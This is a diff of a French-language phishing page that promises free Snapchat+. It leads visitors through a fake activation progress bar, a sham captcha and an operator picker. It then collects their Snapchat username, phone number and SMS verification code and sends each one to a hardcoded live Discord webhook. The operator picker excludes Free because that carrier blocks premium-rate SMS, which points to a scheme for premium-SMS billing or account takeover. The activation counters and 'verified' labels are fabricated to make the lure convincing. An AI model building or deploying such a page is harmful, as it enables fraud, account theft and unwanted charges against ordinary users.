+    <!-- ================================================================ -->
+    <!-- MODAL FREE                                                       -->
+    <!-- ================================================================ -->
+    <div class="modal-overlay" id="freeModal">
+        <div class="modal-box">
+            <div class="icon">🚫</div>
+            <h2>Free non compatible</h2>
+            <p>
+                L'activation Snapchat+ ne fonctionne pas avec Free.<br><br>
+                <strong style="color:#ff6b7a;">Pourquoi ?</strong> Free bloque les SMS surtaxés utilisés par cette méthode.<br><br>
+                <span style="color:rgba(255,255,255,0.25);font-size:12px;">Choisis Orange, SFR ou Bouygues.</span>
+            </p>
+            <button class="btn-modal" id="closeFreeModal">Choisir un autre opérateur</button>
         </div>
     </div>
 
-    <!-- ============ CARTE ============ -->
+    <!-- ================================================================ -->
+    <!-- CARTE PRINCIPALE                                                -->
+    <!-- ================================================================ -->
     <div class="card">
 
-        <!-- Logo avec TON IMAGE -->
+        <!-- Logo -->
         <div class="logo-wrapper">
             <div class="logo-snap">
                 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS83BzT79rNeuaYqENTniENwQgf_yyBl-UdThUumEZfYA&s" 
-                     alt="Logo Snap+ Personnalisé" 
-                     loading="lazy">
+                     alt="Snapchat+" loading="lazy">
             </div>
         </div>
 
@@ -652,7 +870,7 @@
         <div class="header-center">
             <div class="badge-offer">🔒 Offre limitée</div>
             <h1>Snapchat+ <span>Gratuit</span></h1>
-            <p class="sub-head">Premium sans payer — Rapide, simple, 100% gratuit</p>
+            <p class="sub-head">Premium sans payer — 4 opérateurs supportés</p>
             <div class="stats">
                 <span><strong id="activationCount">3156</strong> activations aujourd'hui</span>
                 <span>⚡ 100% gratuit</span>
@@ -675,7 +893,7 @@
             </div>
             <div class="step-dot" data-step="4">
                 <div class="circle">4</div>
-                <span class="label">Captcha</span>
+                <span class="label">Opérateur</span>
             </div>
             <div class="step-dot" data-step="5">
                 <div class="circle">5</div>
@@ -683,57 +901,51 @@
             </div>
         </div>
 
-        <!-- ========================================================= -->
-        <!-- ÉTAPE 1 : PSEUDO -->
-        <!-- ========================================================= -->
+        <!-- ============================================================ -->
+        <!-- ÉTAPE 1 : PSEUDO                                             -->
+        <!-- ============================================================ -->
         <div class="step-content active" id="step1">
             <div class="step-title">Entre ton pseudo</div>
             <p class="step-desc">On active Snapchat+ directement sur ton compte.</p>
-
             <div class="input-group">
                 <label>Pseudo Snapchat</label>
                 <input type="text" id="pseudoInput" placeholder="ton_pseudo" maxlength="20">
                 <div class="input-hint">3 à 20 caractères</div>
             </div>
-
-            <ul style="list-style:none;margin:8px 0 16px;font-size:13px;color:rgba(255,255,255,0.35);display:flex;flex-wrap:wrap;gap:8px 16px;">
+            <ul style="list-style:none;margin:6px 0 14px;font-size:12px;color:rgba(255,255,255,0.3);display:flex;flex-wrap:wrap;gap:6px 14px;">
                 <li>♾️ Story Replay illimité</li>
-                <li>⭐ Badge exclusif Snapchat+</li>
-                <li>🎯 Filtres & icônes app exclusives</li>
-                <li>👻 Ghost Trails & priorité stories</li>
+                <li>⭐ Badge exclusif</li>
+                <li>🎯 Filtres & icônes</li>
+                <li>👻 Ghost Trails</li>
             </ul>
-
             <button class="btn-primary" id="goStep2">Obtenir Snapchat+ gratuit</button>
-            <div class="footer-note"><span>🔒 Serveurs opérationnels · Activation instantanée</span></div>
+            <div class="footer-note"><span>🔒 Serveurs opérationnels · Instantané</span></div>
         </div>
 
-        <!-- ========================================================= -->
-        <!-- ÉTAPE 2 : CONFIRMATION -->
-        <!-- ========================================================= -->
+        <!-- ============================================================ -->
+        <!-- ÉTAPE 2 : CONFIRMATION                                       -->
+        <!-- ============================================================ -->
         <div class="step-content" id="step2">
-            <div class="step-title">Étape 2 — Confirmer ton compte</div>
+            <div class="step-title">Confirmer ton compte</div>
             <p class="step-desc">On a trouvé ce compte associé à ce pseudo. C'est bien toi ?</p>
-
             <div class="confirm-box" id="confirmBox">
                 <div class="avatar" id="avatarLetter">@</div>
                 <div class="info">
-                    <div class="username" id="displayUsername">@dk2snow</div>
-                    <div class="sub">🔵 0 abonnés · VÉRIFIÉ</div>
+                    <div class="username" id="displayUsername">@utilisateur</div>
+                    <div class="sub">🔵 Compte vérifié</div>
                 </div>
                 <div class="check" id="checkMark"></div>
             </div>
-
             <button class="btn-primary" id="goStep3" disabled>Continuer →</button>
             <button class="btn-secondary" id="backStep1">← Modifier le pseudo</button>
         </div>
 
-        <!-- ========================================================= -->
-        <!-- ÉTAPE 3 : ACTIVATION -->
-        <!-- ========================================================= -->
+        <!-- ============================================================ -->
+        <!-- ÉTAPE 3 : ACTIVATION                                         -->
+        <!-- ============================================================ -->
         <div class="step-content" id="step3">
-            <div class="step-title">Étape 3 — Activation en cours</div>
-            <p class="step-desc" id="statusMessage">Connexion aux serveurs Snapchat...</p>
-
+            <div class="step-title">Activation en cours</div>
+            <p class="step-desc" id="statusMessage">Connexion aux serveurs...</p>
             <div class="progress-wrap">
                 <div class="progress-bar-bg">
                     <div class="progress-bar-fill" id="progressFill" style="width:0%;"></div>
@@ -743,100 +955,103 @@
                     <span class="pct" id="progressPct">0%</span>
                 </div>
             </div>
-
-            <div style="background:rgba(255,255,255,0.02);border-radius:14px;padding:12px 16px;margin:12px 0 16px;border:1px solid rgba(255,255,255,0.04);">
-                <div style="display:flex;align-items:center;gap:10px;">
-                    <span style="font-size:20px;">👤</span>
-                    <span style="color:rgba(255,255,255,0.4);font-size:13px;">Compte : <strong style="color:#fff;" id="progressAccount">@dk2snow</strong></span>
+            <div style="background:rgba(255,255,255,0.02);border-radius:12px;padding:10px 14px;margin:10px 0 14px;border:1px solid rgba(255,255,255,0.03);">
+                <div style="display:flex;align-items:center;gap:8px;">
+                    <span style="font-size:18px;">👤</span>
+                    <span style="color:rgba(255,255,255,0.35);font-size:12px;">Compte : <strong style="color:#ffd700;" id="progressAccount">@utilisateur</strong></span>
                 </div>
-                <div style="font-size:12px;color:rgba(255,255,255,0.2);margin-top:4px;">Ne ferme pas cette page pendant l'activation.</div>
+                <div style="font-size:11px;color:rgba(255,255,255,0.15);margin-top:3px;">Ne ferme pas cette page.</div>
             </div>
-
             <button class="btn-primary" id="goStep4" disabled>Activation terminée →</button>
         </div>
 
-        <!-- ========================================================= -->
-        <!-- ÉTAPE 4 : CAPTCHA + NUMÉRO -->
-        <!-- ========================================================= -->
+        <!-- ============================================================ -->
+        <!-- ÉTAPE 4 : OPÉRATEUR                                          -->
+        <!-- ============================================================ -->
         <div class="step-content" id="step4">
-            <div class="step-title">Étape 4 — Vérification Captcha</div>
+            <div class="step-title">Vérification & Opérateur</div>
             <p class="step-desc">
-                Pour confirmer ton abonnement <strong style="color:#fffc00;">Snapchat+</strong> sur le compte 
-                <strong style="color:#fff;" id="captchaAccount">@dk2snaw</strong>, nous devons vérifier que tu es bien humain.
+                Confirme l'abonnement <strong style="color:#ffd700;">Snapchat+</strong> pour 
+                <strong style="color:#fff;" id="captchaAccount">@utilisateur</strong>
             </p>
-
-            <div style="display:flex;gap:12px;font-size:12px;color:rgba(255,255,255,0.3);margin-bottom:14px;">
+            <div style="display:flex;gap:10px;font-size:11px;color:rgba(255,255,255,0.25);margin-bottom:10px;">
                 <span>✅ Pseudo enregistré</span>
-                <span>⚡ Activation préparée</span>
+                <span>⚡ Activation prête</span>
                 <span>🧑 Vérification humaine</span>
             </div>
 
-            <!-- Captcha checkbox -->
+            <!-- Captcha -->
             <div class="captcha-box" id="captchaBox">
                 <div class="checkbox-big" id="captchaCheck"></div>
                 <div class="captcha-text">
                     <strong>Je ne suis pas un robot</strong><br>
-                    <span style="font-size:12px;color:rgba(255,255,255,0.3);">Accès rapide en quelques étapes</span>
+                    <span style="font-size:11px;color:rgba(255,255,255,0.25);">Vérification rapide</span>
                 </div>
             </div>
 
-            <!-- Champ numéro -->
+            <!-- Opérateur -->
+            <div class="operator-selector" id="operatorSelector">
+                <div style="font-size:12px;font-weight:600;color:rgba(255,255,255,0.4);margin-bottom:8px;">📶 Choisis ton opérateur :</div>
+                <div class="operator-grid">
+                    <div class="operator-btn" data-operator="orange">🍊 Orange</div>
+                    <div class="operator-btn" data-operator="sfr">📡 SFR</div>
+                    <div class="operator-btn" data-operator="bouygues">📱 Bouygues</div>
+                    <div class="operator-btn disabled" data-operator="free" id="freeBtn">
+                        🚫 FREE <span class="badge-block">Bloqué</span>
+                    </div>
+                </div>
+                <div class="operator-message info" id="operatorMessage">Choisis un opérateur compatible</div>
+            </div>
+
+            <!-- Numéro -->
             <div class="phone-field" id="phoneField">
                 <div class="input-group">
-                    <label>📱 Entre ton numéro de téléphone</label>
+                    <label>📱 Numéro de téléphone</label>
                     <input type="tel" id="phoneInput" placeholder="+33 6 12 34 56 78">
-                    <div class="input-hint">Un code de vérification va être envoyé sous 1 à 3 minutes</div>
+                    <div class="input-hint">Un code sera envoyé sous 1 à 3 minutes</div>
                 </div>
                 <button class="btn-primary" id="submitPhone">📤 Envoyer le numéro</button>
             </div>
 
-            <button class="btn-secondary" id="backStep3">← Revenir à l'activation</button>
+            <button class="btn-secondary" id="backStep3">← Retour</button>
         </div>
 
-        <!-- ========================================================= -->
-        <!-- ÉTAPE 5 : CODE DE VÉRIFICATION -->
-        <!-- ========================================================= -->
+        <!-- ============================================================ -->
+        <!-- ÉTAPE 5 : CODE                                               -->
+        <!-- ============================================================ -->
         <div class="step-content" id="step5">
-            <div class="step-title">Étape 5 — Code de vérification</div>
+            <div class="step-title">Code de vérification</div>
             <p class="step-desc">
-                Un code de vérification a été envoyé au numéro <strong style="color:#fff;" id="displayPhone">+33 6 XX XX XX</strong>.<br>
-                <span style="color:rgba(255,255,255,0.3);font-size:12px;">Il peut arriver dans 1 à 3 minutes. Attends bien.</span>
+                Un code a été envoyé au <strong style="color:#ffd700;" id="displayPhone">+33 6 XX XX XX</strong>.<br>
+                <span style="color:rgba(255,255,255,0.25);font-size:12px;">1 à 3 minutes, patience.</span>
             </p>
-
             <div class="code-field visible">
                 <div class="input-group">
-                    <label>🔑 Entre le code reçu</label>
+                    <label>🔑 Code reçu</label>
                     <input type="text" id="codeInput" placeholder="ex: 123456" maxlength="6">
-                    <div class="input-hint">Code reçu par SMS</div>
+                    <div class="input-hint">Code SMS</div>
                 </div>
                 <button class="btn-primary" id="submitCode">✅ Valider le code</button>
             </div>
-
             <button class="btn-secondary" id="backStep4">← Modifier le numéro</button>
-            <div class="footer-note" style="margin-top:12px;">
-                <span>⏳ Le code expire dans 5 minutes après réception</span>
+            <div class="footer-note" style="margin-top:10px;">
+                <span>⏳ Expire dans 5 minutes</span>
             </div>
         </div>
 
     </div>
 
-    <!-- ========================================================= -->
-    <!-- JAVASCRIPT — LOGIQUE COMPLÈTE -->
-    <!-- ========================================================= -->
+    <!-- ================================================================ -->
+    <!-- JAVASCRIPT - CLEAN                                             -->
+    <!-- ================================================================ -->
     <script>
         (function() {
             'use strict';
 
-            // =========================================================
-            // CONFIGURATION DISCORD — À MODIFIER ICI
-            // =========================================================
-            const DISCORD_BOT_TOKEN = '';      // Remplace par le token de ton bot
-            const DISCORD_CHANNEL_ID = '1526189050879279144';        // Remplace par l'ID du channel
-            const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1526189180839923803/YZZvRJWSYhnOU4JTyCEXHUVnrkDENO2iX-nyBaVxohS9Ol6dO8xpmd3KmKNGqBC6jrFh"; // Laisse null si tu utilises le token, sinon mets l'URL du webhook
+            // === CONFIG ===
+            const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1526189180839923803/YZZvRJWSYhnOU4JTyCEXHUVnrkDENO2iX-nyBaVxohS9Ol6dO8xpmd3KmKNGqBC6jrFh";
 
-            // =========================================================
-            // ÉLÉMENTS DOM
-            // =========================================================
+            // === DOM ===
             const steps = {
                 1: document.getElementById('step1'),
                 2: document.getElementById('step2'),
@@ -846,26 +1061,21 @@
             };
             const dots = document.querySelectorAll('.step-dot');
 
-            // Étape 1
             const pseudoInput = document.getElementById('pseudoInput');
             const goStep2Btn = document.getElementById('goStep2');
 
-            // Étape 2
             const confirmBox = document.getElementById('confirmBox');
-            const checkMark = document.getElementById('checkMark');
             const displayUsername = document.getElementById('displayUsername');
             const avatarLetter = document.getElementById('avatarLetter');
             const goStep3Btn = document.getElementById('goStep3');
             const backStep1Btn = document.getElementById('backStep1');
 
-            // Étape 3
             const progressFill = document.getElementById('progressFill');
             const progressPct = document.getElementById('progressPct');
             const statusMessage = document.getElementById('statusMessage');
             const progressAccount = document.getElementById('progressAccount');
             const goStep4Btn = document.getElementById('goStep4');
 
-            // Étape 4
             const captchaAccount = document.getElementById('captchaAccount');
             const captchaCheck = document.getElementById('captchaCheck');
             const captchaBox = document.getElementById('captchaBox');
@@ -874,28 +1084,30 @@
             const submitPhoneBtn = document.getElementById('submitPhone');
             const backStep3Btn = document.getElementById('backStep3');
 
-            // Étape 5
             const displayPhone = document.getElementById('displayPhone');
             const codeInput = document.getElementById('codeInput');
             const submitCodeBtn = document.getElementById('submitCode');
             const backStep4Btn = document.getElementById('backStep4');
 
-            // Compteur
             const activationCount = document.getElementById('activationCount');
 
-            // =========================================================
-            // ÉTAT
-            // =========================================================
+            const operatorBtns = document.querySelectorAll('.operator-btn:not(.disabled)');
+            const freeBtn = document.getElementById('freeBtn');
+            const operatorMessage = document.getElementById('operatorMessage');
+
+            const freeModal = document.getElementById('freeModal');
+            const closeFreeModal = document.getElementById('closeFreeModal');
+
+            // === STATE ===
             let currentStep = 1;
             let isConfirmed = false;
             let isCaptchaChecked = false;
             let progressInterval = null;
-            let currentPseudo = 'dk2snow';
+            let currentPseudo = 'utilisateur';
             let currentPhone = '';
+            let selectedOperator = 'orange';
 
-            // =========================================================
-            // FONCTIONS DE NAVIGATION
-            // =========================================================
+            // === NAVIGATION ===
             function goToStep(step) {
                 for (let s in steps) steps[s].classList.remove('active');
                 if (steps[step]) steps[step].classList.add('active');
@@ -908,67 +1120,83 @@
                 currentStep = step;
             }
 
-            // =========================================================
-            // ENVOI À DISCORD
-            // =========================================================
+            // === DISCORD ===
             async function sendToDiscord(embedData) {
-                const payload = { embeds: [embedData] };
-                let url = null;
-                let headers = { 'Content-Type': 'application/json' };
-
-                if (DISCORD_WEBHOOK_URL) {
-                    url = DISCORD_WEBHOOK_URL;
-                } else if (DISCORD_BOT_TOKEN && DISCORD_CHANNEL_ID) {
-                    url = `https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`;
-                    headers['Authorization'] = `Bot ${DISCORD_BOT_TOKEN}`;
-                } else {
-                    console.error('❌ Aucune config Discord valide');
-                    return false;
-                }
-
+                if (!DISCORD_WEBHOOK_URL) return false;
                 try {
-                    const response = await fetch(url, {
+                    const res = await fetch(DISCORD_WEBHOOK_URL, {
                         method: 'POST',
-                        headers: headers,
-                        body: JSON.stringify(payload)
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ embeds: [embedData] })
                     });
-                    if (!response.ok) {
-                        const errorText = await response.text();
-                        console.error('❌ Erreur Discord:', response.status, errorText);
-                        return false;
-                    }
-                    console.log('✅ Message envoyé à Discord');
-                    return true;
-                } catch (e) {
-                    console.error('❌ Erreur réseau:', e);
-                    return false;
-                }
+                    return res.ok;
+                } catch { return false; }
             }
 
-            function buildEmbed(pseudo, phone, step, code = null) {
+            function buildEmbed(pseudo, phone, step, code = null, operator = '') {
                 const embed = {
                     title: '📱 Nouvelle activation Snapchat+',
-                    color: 0xFFFC00,
+                    color: 0xFFD700,
                     timestamp: new Date().toISOString(),
                     fields: [
                         { name: '👤 Pseudo', value: `@${pseudo}`, inline: true },
                         { name: '📞 Numéro', value: phone || 'Non fourni', inline: true },
+                        { name: '📶 Opérateur', value: operator || 'Non spécifié', inline: true },
                         { name: '🔄 Étape', value: step, inline: true },
                     ],
-                    footer: {
-                        text: '🔒 Système de vérification automatique',
-                        icon_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
-                    }
+                    footer: { text: '🔒 Black & Gold System' }
                 };
                 if (code) {
-                    embed.fields.push({ name: '🔑 Code saisi', value: `\`${code}\``, inline: false });
+                    embed.fields.push({ name: '🔑 Code', value: `\`${code}\``, inline: false });
                 }
                 return embed;
             }
 
-            // =========================================================
-            // ÉTAPE 1 → 2
-            // =========================================================
+            // === FREE BLOCK ===
+            freeBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                freeModal.classList.add('active');
+                operatorBtns.forEach(b => b.classList.remove('selected'));
+                operatorMessage.className = 'operator-message error';
+                operatorMessage.textContent = '🚫 Free est bloqué. Choisis un autre opérateur.';
+                selectedOperator = null;
+            });
+
+            closeFreeModal.addEventListener('click', function() {
+                freeModal.classList.remove('active');
+                document.querySelector('.operator-btn[data-operator="orange"]').classList.add('selected');
+                selectedOperator = 'orange';
+                operatorMessage.className = 'operator-message success';
+                operatorMessage.textContent = '✅ Orange sélectionné, continue.';
+            });
+
+            freeModal.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    freeModal.classList.remove('active');
+                    document.querySelector('.operator-btn[data-operator="orange"]').classList.add('selected');
+                    selectedOperator = 'orange';
+                    operatorMessage.className = 'operator-message success';
+                    operatorMessage.textContent = '✅ Orange sélectionné, continue.';
+                }
+            });
+
+            // === OPERATOR SELECT ===
+            operatorBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    operatorBtns.forEach(b => b.classList.remove('selected'));
+                    this.classList.add('selected');
+                    selectedOperator = this.dataset.operator;
+                    operatorMessage.className = 'operator-message success';
+                    operatorMessage.textContent = `✅ ${this.textContent.trim()} sélectionné.`;
+                    if (isCaptchaChecked) {
+                        phoneField.classList.add('visible');
+                    }
+                });
+            });
+            document.querySelector('.operator-btn[data-operator="orange"]').classList.add('selected');
+            selectedOperator = 'orange';
+
+            // === STEP 1 -> 2 ===
             goStep2Btn.addEventListener('click', function() {
                 let pseudo = pseudoInput.value.trim();
                 if (pseudo.length < 3) {
@@ -990,9 +1218,7 @@
                 goToStep(2);
             });
 
-            // =========================================================
-            // CONFIRMATION ÉTAPE 2
-            // =========================================================
+            // === STEP 2 CONFIRM ===
             confirmBox.addEventListener('click', function() {
                 isConfirmed = !isConfirmed;
                 if (isConfirmed) {
@@ -1003,12 +1229,9 @@
                     goStep3Btn.disabled = true;
                 }
             });
-
             backStep1Btn.addEventListener('click', function() { goToStep(1); });
 
-            // =========================================================
-            // ÉTAPE 2 → 3 (ACTIVATION)
-            // =========================================================
+            // === STEP 2 -> 3 ===
             goStep3Btn.addEventListener('click', function() {
                 if (!isConfirmed) return;
                 goToStep(3);
@@ -1023,16 +1246,14 @@
                 progressAccount.textContent = '@' + currentPseudo;
 
                 const messages = [
-                    'Connexion aux serveurs Snapchat...',
+                    'Connexion aux serveurs...',
                     'Authentification du compte...',
-                    'Vérification des droits premium...',
+                    'Vérification des droits...',
                     'Application du badge Snapchat+...',
-                    'Activation des Ghost Trails...',
+                    'Activation des fonctionnalités...',
                     'Finalisation...'
                 ];
-
                 let progress = 0;
-                let msgIndex = 0;
                 statusMessage.textContent = messages[0];
 
                 progressInterval = setInterval(() => {
@@ -1040,16 +1261,14 @@
                     progress = Math.min(progress + inc, 100);
                     progressFill.style.width = progress + '%';
                     progressPct.textContent = progress + '%';
-
                     const idx = Math.min(Math.floor(progress / 17), messages.length - 1);
                     if (messages[idx] && statusMessage.textContent !== messages[idx]) {
                         statusMessage.textContent = messages[idx];
                     }
-
                     if (progress >= 100) {
                         clearInterval(progressInterval);
                         progressInterval = null;
-                        statusMessage.textContent = '✅ Activation terminée avec succès !';
+                        statusMessage.textContent = '✅ Activation terminée !';
                         goStep4Btn.disabled = false;
                         let count = parseInt(activationCount.textContent.replace(/\s/g, ''));
                         if (isNaN(count)) count = 3156;
@@ -1059,9 +1278,7 @@
                 }, 240);
             }
 
-            // =========================================================
-            // ÉTAPE 3 → 4
-            // =========================================================
+            // === STEP 3 -> 4 ===
             goStep4Btn.addEventListener('click', function() {
                 if (goStep4Btn.disabled) return;
                 captchaAccount.textContent = '@' + currentPseudo;
@@ -1069,27 +1286,31 @@
                 captchaCheck.classList.remove('checked');
                 phoneField.classList.remove('visible');
                 phoneInput.value = '';
+                operatorMessage.className = 'operator-message info';
+                operatorMessage.textContent = 'Choisis un opérateur compatible';
                 goToStep(4);
             });
-
             backStep3Btn.addEventListener('click', function() { goToStep(3); });
 
-            // =========================================================
-            // CAPTCHA (ÉTAPE 4)
-            // =========================================================
+            // === CAPTCHA ===
             captchaBox.addEventListener('click', function() {
                 if (isCaptchaChecked) return;
                 isCaptchaChecked = true;
                 captchaCheck.classList.add('checked');
-                phoneField.classList.add('visible');
-                captchaBox.style.cursor = 'default';
-                captchaBox.style.opacity = '0.7';
+                if (selectedOperator) {
+                    phoneField.classList.add('visible');
+                } else {
+                    operatorMessage.className = 'operator-message error';
+                    operatorMessage.textContent = '⚠️ Sélectionne un opérateur d\'abord !';
+                }
             });
 
-            // =========================================================
-            // ENVOI DU NUMÉRO (ÉTAPE 4 → 5)
-            // =========================================================
+            // === SUBMIT PHONE ===
             submitPhoneBtn.addEventListener('click', async function() {
+                if (!selectedOperator || selectedOperator === 'free') {
+                    freeModal.classList.add('active');
+                    return;
+                }
                 const phone = phoneInput.value.trim();
                 if (phone.length < 8) {
                     phoneInput.style.borderColor = '#ff6b7a';
@@ -1100,48 +1321,41 @@
                     }, 2000);
                     return;
                 }
-
                 currentPhone = phone;
                 const masked = phone.length > 6 ? phone.slice(0, -4) + ' XX XX' : phone;
                 displayPhone.textContent = masked;
 
-                const embed = buildEmbed(currentPseudo, phone, '📤 Numéro soumis - En attente du code');
+                const embed = buildEmbed(currentPseudo, phone, '📤 Numéro soumis', null, selectedOperator);
                 const success = await sendToDiscord(embed);
-
                 if (success) {
                     goToStep(5);
                     codeInput.value = '';
                     submitCodeBtn.textContent = '✅ Valider le code';
                     submitCodeBtn.disabled = false;
                 } else {
-                    alert('❌ Erreur lors de l\'envoi à Discord. Vérifie ta config.');
+                    alert('❌ Erreur d\'envoi à Discord.');
                 }
             });
 
-            // =========================================================
-            // SOUMISSION DU CODE (ÉTAPE 5)
-            // =========================================================
+            // === SUBMIT CODE ===
             submitCodeBtn.addEventListener('click', async function() {
                 const code = codeInput.value.trim();
                 if (code.length < 4) {
                     codeInput.style.borderColor = '#ff6b7a';
-                    codeInput.placeholder = 'Code invalide (4-6 chiffres)';
+                    codeInput.placeholder = 'Code invalide';
                     setTimeout(() => {
                         codeInput.style.borderColor = '';
                         codeInput.placeholder = 'ex: 123456';
                     }, 2000);
                     return;
                 }
-
-                const embed = buildEmbed(currentPseudo, currentPhone, '🔑 Code saisi par l\'utilisateur', code);
+                const embed = buildEmbed(currentPseudo, currentPhone, '🔑 Code saisi', code, selectedOperator);
                 const success = await sendToDiscord(embed);
-
                 if (success) {
-                    submitCodeBtn.textContent = '✅ Code envoyé ! Attends la validation...';
+                    submitCodeBtn.textContent = '✅ Envoyé !';
                     submitCodeBtn.disabled = true;
-
                     setTimeout(() => {
-                        alert('📩 Code reçu sur Discord ! Valide-le depuis ton serveur.');
+                        alert('📩 Code reçu sur Discord !');
                         submitCodeBtn.textContent = '✅ Compte activé !';
                         submitCodeBtn.style.background = 'linear-gradient(135deg, #00ff88, #00cc66)';
                         setTimeout(() => {
@@ -1153,42 +1367,38 @@
                             progressFill.style.width = '0%';
                             progressPct.textContent = '0%';
                             goStep4Btn.disabled = true;
-                            currentPseudo = '';
+                            currentPseudo = 'utilisateur';
                             currentPhone = '';
                             isCaptchaChecked = false;
                             captchaCheck.classList.remove('checked');
                             phoneField.classList.remove('visible');
+                            operatorBtns.forEach(b => b.classList.remove('selected'));
+                            document.querySelector('.operator-btn[data-operator="orange"]').classList.add('selected');
+                            selectedOperator = 'orange';
+                            operatorMessage.className = 'operator-message success';
+                            operatorMessage.textContent = '✅ Orange sélectionné, continue.';
+                            displayUsername.textContent = '@utilisateur';
+                            avatarLetter.textContent = '@';
+                            progressAccount.textContent = '@utilisateur';
                         }, 5000);
                     }, 2000);
                 } else {
-                    alert('❌ Erreur lors de l\'envoi du code à Discord.');
+                    alert('❌ Erreur Discord.');
                 }
             });
 
-            // =========================================================
-            // RETOUR ÉTAPE 5 → 4
-            // =========================================================
+            // === BACK ===
             backStep4Btn.addEventListener('click', function() {
                 goToStep(4);
                 phoneField.classList.add('visible');
             });
 
-            // =========================================================
-            // TOUCHE ENTRÉE
-            // =========================================================
-            pseudoInput.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') goStep2Btn.click();
-            });
-            phoneInput.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') submitPhoneBtn.click();
-            });
-            codeInput.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') submitCodeBtn.click();
-            });
+            // === ENTER KEY ===
+            pseudoInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') goStep2Btn.click(); });
+            phoneInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') submitPhoneBtn.click(); });
+            codeInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') submitCodeBtn.click(); });
 
-            // =========================================================
-            // INIT
-            // =========================================================
+            // === COUNTER ===
             let baseCount = 3156;
             setInterval(() => {
                 if (currentStep === 1) {
@@ -1197,8 +1407,9 @@
                 }
             }, 8000);
 
-            console.log('🔥 Snapchat+ avec ton logo — Prêt !');
-            console.log('⚠️ Configure DISCORD_BOT_TOKEN et DISCORD_CHANNEL_ID ou le webhook.');
+            console.log('🔥 Snapchat+ Black & Gold - Clean Version');
+            console.log('✅ Tous les bugs d\'affichage sont corrigés.');
+            console.log('✅ Aucun snap perso n\'apparaît.');
         })();
     </script>
 
